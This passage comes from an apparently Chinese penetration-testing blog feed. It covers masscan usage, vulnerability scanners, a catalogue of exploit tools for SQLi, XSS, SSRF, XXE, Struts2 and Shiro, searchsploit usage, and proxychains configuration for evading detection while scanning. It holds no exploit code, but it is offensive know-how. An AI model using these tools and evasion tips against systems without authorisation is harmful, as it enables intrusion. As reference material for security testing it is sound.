<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.188 -p80,8080 --echo &gt; scan.conf</span><br><span class="line">masscan -c scan.conf --rate 1000</span><br></pre></td></tr></table></figure>

<ul>
<li>将扫描结果导出到XML文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masscan 192.168.123.188 -p0-65535 -oX scan.xml</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>系统与网络漏洞扫描器</title>
    <url>/post/57b56c16.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>Nessus是全球使用人数最多的系统漏洞扫描与分析软件，这是一个免费、威力强大、更新频繁并简易使用的远端系统安全扫描程序，功能十分强大。</p>
<h3 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h3><p>Nessus有教育版和专业版。Nessus教育版最大只支持扫描16个主机,但利用docker无限使用,当然虚拟机快照也可以。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -itd -p 8834:8834 registry.cn-hangzhou.aliyuncs.com/steinven/nessus:v0.1</span><br></pre></td></tr></table></figure>

<p>注意该命令中的–rm参数，每次容器停止后会自动删除，如不想删除，去掉该参数即可</p>
<p>访问<code>https://ip:8834</code>（注意是<code>https</code>），账号：<code>admin</code>密码：<code>admin</code></p>
<h2 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h2><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。7.2版本内置94个功能模块,外部模块18个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、SMBGhost、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破13种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、NBT、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
<p>项目地址：<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
<p>使用文档：<a href="https://k8gege.org/Ladon/">https://k8gege.org/Ladon/</a></p>
<h2 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h2><p>OpenVAS 是一个全功能的漏洞扫描器。它的功能包括非认证测试、认证测试、各种高水平和低水平的互联网和工业协议、大规模扫描的性能调整和一个强大的内部编程语言来实现任何类型的漏洞测试。</p>
<p>使用Kali Linux 进行安装、扫描教程：</p>
<p><a href="https://www.kali.org/blog/openvas-vulnerability-scanning/">https://www.kali.org/blog/openvas-vulnerability-scanning/</a></p>
<h2 id="Nexpose"><a href="#Nexpose" class="headerlink" title="Nexpose"></a>Nexpose</h2><p>Rapid7 Nexpose是一款面向大型网络组织的安全风险智能解决方案。</p>
<p>Nexpose主动支持整个漏洞管理生命周期，包括发现，检测，验证，风险分类，影响分析，报告和缓解。</p>
<p>官网地址：<a href="https://www.rapid7.com/products/nexpose/">https://www.rapid7.com/products/nexpose/</a></p>
<p>下载与安装教程：<a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a></p>
<p>使用教程：<a href="https://www.yiibai.com/ethical_hacking/ethical-hacking-nexpose-analysis.html">https://www.yiibai.com/ethical_hacking/ethical-hacking-nexpose-analysis.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>单功能漏洞扫描器</title>
    <url>/post/374a33b3.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SQL注入漏洞扫描利用工具"><a href="#SQL注入漏洞扫描利用工具" class="headerlink" title="SQL注入漏洞扫描利用工具"></a>SQL注入漏洞扫描利用工具</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<p>官网地址：<a href="https://sqlmap.org/">https://sqlmap.org/</a></p>
<p>这里只是进行一个简单的介绍，之后会对sqlmap进行一个详细讲解。</p>
<h3 id="Pangolin"><a href="#Pangolin" class="headerlink" title="Pangolin"></a>Pangolin</h3><p>Pangolin能够通过一系列非常简单的操作，达到最大化的攻击测试效果。它从检测注入开始到最后控制目标系统都给出了测试步骤。</p>
<h2 id="XSS漏洞扫描利用工具"><a href="#XSS漏洞扫描利用工具" class="headerlink" title="XSS漏洞扫描利用工具"></a>XSS漏洞扫描利用工具</h2><h3 id="XSSer"><a href="#XSSer" class="headerlink" title="XSSer"></a>XSSer</h3><p>XSSer (Cross site “scripter”)是一款自动化渗透测试XSS漏洞的安全工具,专门用来检测和利用不同应用程序中存在的跨站脚本漏洞。它包含了一些选项用来尝试绕过特定的过滤器，并且具有特殊的代码注入技术。</p>
<h3 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h3><p>XSStrike 是一个跨站点脚本攻击检测套件，包含四个手写的解析器，一个智能有效的 payload 生成器，一个强大的模糊搜索引擎和一个非常快速的爬虫。</p>
<p>项目地址：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p>
<h3 id="Xspear"><a href="#Xspear" class="headerlink" title="Xspear"></a>Xspear</h3><p>一款基于 RubyGems 的 XSS 漏洞扫描器。能够进行常见的 XSS 扫描测试以及参数分析。</p>
<p>项目地址：<a href="https://github.com/hahwul/XSpear">https://github.com/hahwul/XSpear</a></p>
<h3 id="ezXSS"><a href="#ezXSS" class="headerlink" title="ezXSS"></a>ezXSS</h3><p>ezXSS是一款用于渗透测试和漏洞挖掘的XSS盲测跨站脚本工具。</p>
<p>项目地址：<a href="https://github.com/ssl/ezXSS">https://github.com/ssl/ezXSS</a></p>
<h3 id="OWASP-Xenotix-XSS"><a href="#OWASP-Xenotix-XSS" class="headerlink" title="OWASP Xenotix XSS"></a>OWASP Xenotix XSS</h3><p>Xenotix XSS Exploit Framework是一款用于检测和利用WEB应用程序中的XSS漏洞的渗透测试工具。这个工具可以将代码注入到含有xss漏洞的web页面中。</p>
<h2 id="CSRF漏洞扫描利用工具"><a href="#CSRF漏洞扫描利用工具" class="headerlink" title="CSRF漏洞扫描利用工具"></a>CSRF漏洞扫描利用工具</h2><h3 id="CSRF-Tester"><a href="#CSRF-Tester" class="headerlink" title="CSRF Tester"></a>CSRF Tester</h3><p>CSRFTester是一个用于测试网站中CSRF（跨站点请求伪造）漏洞的开源工具。</p>
<h3 id="CSRF-Request-Builder"><a href="#CSRF-Request-Builder" class="headerlink" title="CSRF Request Builder"></a>CSRF Request Builder</h3><p>CSRF Request Builder是一款CSRF漏洞利用和测试工具。</p>
<p>项目地址：<a href="https://github.com/PanYX/CSRF-Request-Builder">https://github.com/PanYX/CSRF-Request-Builder</a></p>
<h2 id="SSRF漏洞扫描利用工具"><a href="#SSRF漏洞扫描利用工具" class="headerlink" title="SSRF漏洞扫描利用工具"></a>SSRF漏洞扫描利用工具</h2><h3 id="Extended-ssrf-search"><a href="#Extended-ssrf-search" class="headerlink" title="Extended ssrf search"></a>Extended ssrf search</h3><p>Extended ssrf search是一款功能强大的SSRF智能漏洞扫描工具，该工具可以通过在请求中设置不同的预定义参数来搜索SSRF漏洞，这些参数包括路径、主机、Header、POST和GET参数。</p>
<p>项目地址：<a href="https://github.com/Damian89/extended-ssrf-search">https://github.com/Damian89/extended-ssrf-search</a></p>
<h3 id="See-SURF"><a href="#See-SURF" class="headerlink" title="See-SURF"></a>See-SURF</h3><p>See-SURF是一款基于Python开发的扫描工具，它可以帮助安全研究人员查找并发现目标Web应用程序中潜在的SSRF参数。</p>
<p>项目地址：<a href="https://github.com/In3tinct/See-SURF">https://github.com/In3tinct/See-SURF</a></p>
<h2 id="XXE漏洞扫描利用工具"><a href="#XXE漏洞扫描利用工具" class="headerlink" title="XXE漏洞扫描利用工具"></a>XXE漏洞扫描利用工具</h2><h3 id="XXExploiter"><a href="#XXExploiter" class="headerlink" title="XXExploiter"></a>XXExploiter</h3><p>XXExploiter是一款功能强大的XXE漏洞扫描与利用工具，在它的帮助下，广大安全研究人员可以轻松发现和利用XXE漏洞。</p>
<p>项目地址：<a href="https://github.com/luisfontes19/xxexploiter">https://github.com/luisfontes19/xxexploiter</a></p>
<h3 id="xxer"><a href="#xxer" class="headerlink" title="xxer"></a>xxer</h3><p>XXE盲注回调处理程序。使用HTTP和FTP提取信息。</p>
<p>项目地址：<a href="https://github.com/TheTwitchy/xxer">https://github.com/TheTwitchy/xxer</a></p>
<h2 id="CMS通用漏洞扫描利用工具"><a href="#CMS通用漏洞扫描利用工具" class="headerlink" title="CMS通用漏洞扫描利用工具"></a>CMS通用漏洞扫描利用工具</h2><h3 id="CMSmap"><a href="#CMSmap" class="headerlink" title="CMSmap"></a>CMSmap</h3><p>CMSmap是一个Python编写的针对开源CMS（内容管理系统）的安全扫描器，它可以自动检测当前国外最流行的CMS的安全漏洞。 CMSmap主要是在一个单一的工具集合了不同类型的CMS的常见的漏洞。CMSmap目前只支持WordPress，Joomla和Drupal。</p>
<p>项目地址：<a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a></p>
<h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a>WPScan</h3><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>
<h3 id="JoomScan"><a href="#JoomScan" class="headerlink" title="JoomScan"></a>JoomScan</h3><p>OWASP Joomla！漏洞扫描程序（JoomScan）是一个开源项目，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。该工具在Perl中实现，可以无缝轻松地扫描Joomla安装，同时通过其轻量级和模块化架构留下最小的占地面积。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷，这些缺陷可被攻击者利用来破坏系统。此外，OWASP JoomScan提供了用户友好的界面，并以文本和HTML格式编译最终报告，以便于使用和最小化报告开销。 OWASP JoomScan包含在Kali Linux发行版中。</p>
<h3 id="DeDeScan"><a href="#DeDeScan" class="headerlink" title="DeDeScan"></a>DeDeScan</h3><p>dedescan是一款可以扫描所有已公开的dedecms漏洞的扫描器。</p>
<p>项目地址：<a href="https://github.com/lengjibo/dedecmscan">https://github.com/lengjibo/dedecmscan</a></p>
<h3 id="DzScan"><a href="#DzScan" class="headerlink" title="DzScan"></a>DzScan</h3><p>DzScan是一款Python编写的针对大部分Discuz CMS漏洞的扫描工具。</p>
<p>项目地址：<a href="https://github.com/melodyzx/dzscan">https://github.com/melodyzx/dzscan</a></p>
<h2 id="Web框架漏洞扫描利用工具"><a href="#Web框架漏洞扫描利用工具" class="headerlink" title="Web框架漏洞扫描利用工具"></a>Web框架漏洞扫描利用工具</h2><h3 id="Struts2-Scan"><a href="#Struts2-Scan" class="headerlink" title="Struts2-Scan"></a>Struts2-Scan</h3><p>Struts2漏洞利用扫描工具，基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057</p>
<p>项目地址：<a href="https://gitee.com/sq_smile/Struts2-Scan">https://gitee.com/sq_smile/Struts2-Scan</a></p>
<h3 id="s2sniper"><a href="#s2sniper" class="headerlink" title="s2sniper"></a>s2sniper</h3><p>这是一款针对struts2的漏洞检测工具，目前支持检测045，046，048，并且可以继续添加，可批量，可自定义线程数。</p>
<p>项目地址：<a href="https://github.com/theLSA/s2sniper">https://github.com/theLSA/s2sniper</a></p>
<h3 id="K8-Struts2-Exp"><a href="#K8-Struts2-Exp" class="headerlink" title="K8 Struts2 Exp"></a>K8 Struts2 Exp</h3><p>一款Struts2综合漏洞利用工具，可以对Struts2框架漏洞进行扫描与利用。</p>
<h3 id="Struts2漏洞检查工具"><a href="#Struts2漏洞检查工具" class="headerlink" title="Struts2漏洞检查工具"></a>Struts2漏洞检查工具</h3><p>一款安恒大佬编写的Struts2全版本漏洞检测与利用工具。</p>
<h3 id="TPscan"><a href="#TPscan" class="headerlink" title="TPscan"></a>TPscan</h3><p>一个thinkphp的漏洞集成检测工具,TPScan目前能检测的Thinkphp漏洞列表[18个],包含TP3、TP5已知漏洞。</p>
<p>项目地址：<a href="https://github.com/Lucifer1993/TPscan">https://github.com/Lucifer1993/TPscan</a></p>
<h2 id="Web中间件扫描利用工具"><a href="#Web中间件扫描利用工具" class="headerlink" title="Web中间件扫描利用工具"></a>Web中间件扫描利用工具</h2><h3 id="Vulmap"><a href="#Vulmap" class="headerlink" title="Vulmap"></a>Vulmap</h3><p>Vulmap 是一款 web 漏洞扫描和验证工具, 可对 webapps 进行漏洞扫描, 并且具备漏洞利用功能, 目前支持的 webapps 包括 activemq, flink, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, fastjson, jenkins, nexus, weblogic, jboss, spring, thinkphp</p>
<p>Vulmap 将漏洞扫描与验证（漏洞利用）结合到了一起, 及大程度便于测试人员在发现漏洞后及时进行下一步操作, 工具追求于于高效、便捷 高效: 逐步开发中慢慢引入了批量扫描、Fofa、Shodan 批量扫描, 且支持多线程默认开启协程, 以最快的速度扫描大量资产 便捷: 发现漏洞即可利用, 大量资产扫描可多格式输出结果</p>
<p>项目地址：<a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></p>
<h3 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h3><p>Nuclei可以基于模板来跨目标发送请求，能够实现零误报，并且可以帮助研究人员对已知路径执行有效的扫描。Nuclei的主要使用场景为网络侦察的初始阶段，可以帮助研究人员快速检查已知且易于探测的目标中是否存在安全漏洞。该工具使用了来处理各种错误，并在Web应用防火墙屏蔽的情况下进行自动重传，这也是该工具的核心模块之一。</p>
<p>项目地址（本体）：<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p>
<p>项目地址（模板）：<a href="https://github.com/projectdiscovery/nuclei-templates">https://github.com/projectdiscovery/nuclei-templates</a></p>
<h3 id="weblogic-scan"><a href="#weblogic-scan" class="headerlink" title="weblogic-scan"></a>weblogic-scan</h3><p>weblogic 漏洞扫描工具。</p>
<p>目前检测的功能：</p>
<ul>
<li>console 页面探测 &amp; 弱口令扫描</li>
<li>uuid页面的SSRF</li>
<li>CVE-2017-10271 wls-wsat页面的反序列化</li>
<li>CVE-2018-2628 反序列化</li>
<li>CNVD-C-2019-48814</li>
</ul>
<p>项目地址：<a href="https://github.com/kingkaki/weblogic-scan">https://github.com/kingkaki/weblogic-scan</a></p>
<h3 id="JexBoss"><a href="#JexBoss" class="headerlink" title="JexBoss"></a>JexBoss</h3><p>Jexboss是一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。</p>
<p>项目地址：<a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p>
<h3 id="shiro-attack"><a href="#shiro-attack" class="headerlink" title="shiro attack"></a>shiro attack</h3><p>基于javafx,利用shiro反序列化漏洞进行回显命令执行以及注入各类内存马。</p>
<p>项目地址：<a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
<h3 id="DockerXScan"><a href="#DockerXScan" class="headerlink" title="DockerXScan"></a>DockerXScan</h3><p>Docker镜像漏洞扫描器，对docker镜像逐层分析，并提取其版本特征。 通过匹配特征，来比对CVE漏洞。</p>
<p>项目地址：<a href="https://github.com/antime/DockerXScan">https://github.com/antime/DockerXScan</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全漏洞库</title>
    <url>/post/dc330496.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Exploit-DB"><a href="#Exploit-DB" class="headerlink" title="Exploit-DB"></a>Exploit-DB</h2><p>ExploitDB 是一个面向全世界黑客的漏洞提交平台，该平台会公布最新漏洞的相关情况，这些可以帮助企业改善公司的安全状况，同时也以帮助安全研究者和渗透测试工程师更好的进行安全测试工作。Exploit-DB提供一整套庞大的归档体系，其中涵盖了各类公开的攻击事件、漏洞报告、安全文章以及技术教程等资源。</p>
<h3 id="在线查找漏洞"><a href="#在线查找漏洞" class="headerlink" title="在线查找漏洞"></a>在线查找漏洞</h3><p>到<a href="https://www.exploit-db.com/">https://www.exploit-db.com</a>上搜索即可。</p>
<p><img src="https://i.loli.net/2021/10/14/va62dhtME1wq9zI.png" alt="image-20211014172310542"></p>
<h3 id="离线查找漏洞"><a href="#离线查找漏洞" class="headerlink" title="离线查找漏洞"></a>离线查找漏洞</h3><p>使用searchsploit命令行工具。</p>
<p><strong>1、更新数据库</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -u</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/14/PmsB5J1KepGg7R6.png" alt="image-20211014171737427"></p>
<p><strong>2、查看帮助信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -h</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/14/G1UYa6AlB3qKZCd.png" alt="image-20211014180731979"></p>
<p><strong>3、查找漏洞</strong></p>
<p>默认情况下 以and 进行筛选，筛选出Metasploit的脚本。</p>
<p>然后把脚本放入msf对应的目录/usr/share/metasploit-framework/modules/**/之下，之后在msfconle下执行reload_all即可使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit exploits linux remote Metasploit Samba</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/14/Lxgt9isKMqJzDuv.png" alt="image-20211014172828657"></p>
<p><strong>4、查看具体ID的功能 利用方式代码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit 42084 --examine</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/14/25UdGrQ7gzSp8JL.png" alt="image-20211014180804336"></p>
<p><strong>5、 拷贝路径，或文件</strong></p>
<p>拷贝路径： <code>searchsploit -p EDB-ID</code></p>
<p>拷贝代码文件到当前目录：<code>searchsploit -m EDB-ID</code></p>
<p><img src="https://i.loli.net/2021/10/14/HcWGUn5deMqOlKs.png" alt="image-20211014173113069"></p>
<p><strong>6、显示在线url，排除关键字</strong></p>
<p><img src="https://i.loli.net/2021/10/14/Afnj6tIJBavu59G.png" alt="image-20211014181014634"></p>
<h2 id="常用漏洞公布网站"><a href="#常用漏洞公布网站" class="headerlink" title="常用漏洞公布网站"></a>常用漏洞公布网站</h2><p>国家信息安全漏洞库（CNNVD）：<a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></p>
<p>国家信息安全漏洞共享平台（CNVD）：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p>
<p>通用漏洞披露平台（CVE）：<a href="https://cve.mitre.org/">https://cve.mitre.org/</a></p>
<p>通用缺陷枚举平台（CWE）：<a href="https://cwe.mitre.org/">https://cwe.mitre.org/</a></p>
<p>美国国家漏洞库：<a href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></p>
<p>信息安全漏洞门户：<a href="http://vulhub.org.cn/">http://vulhub.org.cn/</a></p>
<p>知道创宇-Seebug：<a href="https://www.seebug.org/">https://www.seebug.org/</a></p>
<p>绿盟科技漏洞发布：<a href="http://www.nsfocus.net/index.php?act=sec_bug">http://www.nsfocus.net/index.php?act=sec_bug</a></p>
<h2 id="PeiQi-WiKi"><a href="#PeiQi-WiKi" class="headerlink" title="PeiQi WiKi"></a>PeiQi WiKi</h2><p>PeiQi大佬整理的漏洞POC与红队工具文库，原来是有线上地址的，不过受9月新规（数据安全法）的影响，关闭了网站。项目仓库还是有的，大家可以自行搭建。</p>
<p>PeiQi WiKi-POC文库：<a href="https://github.com/PeiQi0/PeiQi-WIKI-POC">https://github.com/PeiQi0/PeiQi-WIKI-POC</a></p>
<p>PeiQi WiKi-RED文库：<a href="https://github.com/PeiQi0/PeiQi-WIKI-RED">https://github.com/PeiQi0/PeiQi-WIKI-RED</a></p>
<h2 id="乌云镜像站"><a href="#乌云镜像站" class="headerlink" title="乌云镜像站"></a>乌云镜像站</h2><p>乌云网（WooYun）漏洞平台是一个位于厂商和安全研究者之间的安全问题反馈平台，在对安全问题进行反馈处理跟进的同时，为互联网安全研究者提供一个公益、学习、交流和研究的平台。其名字来源于目前互联网上的“云”，在这个不做“云”不好意思和人家打招呼的时代，网络安全相关的，无论是技术还是思路都会有点黑色的感觉，所以自然出现了乌云。2016年7月20日，乌云网因官方正在进行升级，至今无法访问。</p>
<p>github地址：<a href="https://github.com/hanc00l/wooyun_public">https://github.com/hanc00l/wooyun_public</a></p>
<p>在线镜像地址：<a href="http://wy.zone.ci/">http://wy.zone.ci/</a></p>
<h2 id="GitHub常见漏洞PoC与EXP"><a href="#GitHub常见漏洞PoC与EXP" class="headerlink" title="GitHub常见漏洞PoC与EXP"></a>GitHub常见漏洞PoC与EXP</h2><p>Middleware-Vulnerability-detection：<a href="https://github.com/lovechinacoco/https-github.com-mai-lang-chai-Middleware-Vulnerability-detection">https://github.com/lovechinacoco/https-github.com-mai-lang-chai-Middleware-Vulnerability-detection</a></p>
<p>Penetration_Testing_POC：<a href="https://github.com/Mr-xn/Penetration_Testing_POC">https://github.com/Mr-xn/Penetration_Testing_POC</a></p>
<p>super-guacamole：<a href="https://github.com/xiazibet/super-guacamole">https://github.com/xiazibet/super-guacamole</a></p>
<p>CMS-Hunter：<a href="https://github.com/SecWiki/CMS-Hunter">https://github.com/SecWiki/CMS-Hunter</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>代理与代理池</title>
    <url>/post/5b1bcb5a.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="代理的介绍"><a href="#代理的介绍" class="headerlink" title="代理的介绍"></a>代理的介绍</h2><h3 id="代理是什么？"><a href="#代理是什么？" class="headerlink" title="代理是什么？"></a>代理是什么？</h3><p>代理IP又称代理服务器(Proxy Server)，形象的讲，代理服务器是网络信息的中转站，它是介于浏览器和Web服务器之间的一台服务器，有了它之后，Request信号会先送到代理服务器，由代理服务器来取回浏览器所需要的信息并传送给你的浏览器。</p>
<h3 id="代理有什么用？"><a href="#代理有什么用？" class="headerlink" title="代理有什么用？"></a>代理有什么用？</h3><p>使用爬虫爬取网站或者使用扫描器扫描目标时经常会遇到扫描频率较为频繁导致IP被封或者限制访问的情况，这时候我们就需要考虑利用IP代理的方式不断的变换IP进行爬虫和扫描，从而逃避目标端的检测。</p>
<h3 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h3><p>代理池管理大量代理。换句话说，它是一个控制代理质量的系统，并决定哪些IP将被包含在某人使用的一组代理中。</p>
<p>如果您花费大量时间完成上述任务（例如SEO，数据挖掘），则使用代理池非常有用。通常情况下，从单一住宅IP发出所有请求是不安全的，因为您可以快速被禁止。</p>
<p>因此，您需要拥有一组始终保持IP隐藏的代理。此外，它们将足够快地旋转，以便目标网站服务器没有足够的时间将其中任何一个识别为可疑。</p>
<p>但是，在开始执行任务之前，需要准备好代理池。这使您可以专注于您正在做的事情而不是担心如果您将被服务器禁止。</p>
<h3 id="如何获取代理IP"><a href="#如何获取代理IP" class="headerlink" title="如何获取代理IP"></a>如何获取代理IP</h3><p>免费代理的网站问一下度娘或者谷哥应该就能得到很多答案，有：快代理 ()[<a href="https://www.kuaidaili.com/free/">https://www.kuaidaili.com/free/</a>) 、[ProxyList（<a href="https://proxy-list.org/english/index.php">https://proxy-list.org/english/index.php</a>) ，PorxyList是国外的一个提供免费代理的网站，貌似需要翻墙访问，这里我使用快代理提供的IP和端口。</p>
<p><img src="https://i.loli.net/2021/10/05/Z4BceUm6oHlxjGs.jpg" alt="img"></p>
<p><img src="https://i.loli.net/2021/10/05/N5scE2XdCJIo4gU.jpg" alt="img"></p>
<p>需要注意的是，在使用proxychains代理转发过程中，如果目标对象为https，那么需要使用支持SSL/https协议的代理，快代理提供的免费代理均只支持http协议；Proxy List中有支持SSL/HTTPS协议且免费的代理。</p>
<p>不过还是建议购买付费代理池。</p>
<h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。</p>
<h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p>在以下几种场合，你可以考虑使用ProxyChains：需要通过代理上网，或者需要突破诸如设置了端口限制的防火墙；或者要使用telnet，ssh，wget，vnc，apt，ftp，nmap等应用；事实上，甚至可以通过ProxyChains设置反向代理来让你能够从外部访问你的内部局域网。突破防火墙限制访问互联网。</p>
<h3 id="特色功能"><a href="#特色功能" class="headerlink" title="特色功能"></a>特色功能</h3><p>①支持不同的代理选择策略： 随机（代理列表内），顺序，动态顺序 (智能排除无用的代理)</p>
<p>②可以与任意程序结合使用，甚至网络扫描。通过代理或代理链可以实现端口扫描。</p>
<p>③通过可调的超时设定，支持真正的长代理链。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Kali中自带ProxyChains，也可以从<a href="https://github.com/rofl0r/proxychains-ng%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E3%80%82ProxyChains%E8%BF%90%E8%A1%8C%E7%9A%84%E6%89%80%E6%9C%89%E9%85%8D%E7%BD%AE%E9%83%BD%E5%9C%A8/etc/proxychains.conf%E4%B8%AD%E3%80%82">https://github.com/rofl0r/proxychains-ng下载安装。ProxyChains运行的所有配置都在/etc/proxychains.conf中。</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install proxychains4</span><br></pre></td></tr></table></figure>

<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>修改配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<ul>
<li>dynamic_chain：该配置项能够通过ProxyList中的每个代理运行流量，如果其中一个代理关闭或者没有响应，它能够自动选择ProxyList中的下一个代理。</li>
<li>strict_chain：改配置为ProxyChains的默认配置，不同于dynamic_chain，也能够通过ProxyList中的每个代理运行流量，但是如果ProxyList中的代理出现故障，不会自动切换到下一个。</li>
<li>random_chain：该配置项会从ProxyList中随机选择代理IP来运行流量，如果ProxyList中有多个代理IP，在使用proxychains的时候会使用不同的代理访问目标主机，从而使主机端探测流量更加困难。</li>
</ul>
<p>例如：现在需要添加一个Socks5代理</p>
<p>将 dynamic_chain 前面的 “#” 去掉，并在 strict_chain 前添加 “#” 。</p>
<p><img src="https://i.loli.net/2021/10/05/RIaXKnkBHUxG7QL.png" alt="配置1"></p>
<p>来到文件尾部，注释掉 sock4 开头的一行配置信息，因为我们需要所有流量均走 socks5 ，在其下方添加一行配置信息，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socks5 &lt;主机IP&gt; &lt;转发端口&gt;</span><br></pre></td></tr></table></figure>

